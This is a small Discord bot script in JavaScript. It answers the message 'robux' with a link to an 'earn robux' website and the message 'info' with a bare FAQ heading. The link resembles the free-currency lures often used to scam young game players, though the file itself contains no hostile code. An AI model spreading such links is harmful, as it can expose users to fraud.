const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    console.log('I am ready!');
});

client.on('message', message => {
    if (message.content === 'robux') {
    	message.reply('https://earnrobux.online/');
  	}
});

client.on('message', message => {
    if (message.content === 'info') {
       message.reply('**FAQ**');
  	}
});

// THIS  MUST  BE  THIS  WAY
client.login(process.env.BOT_TOKEN);
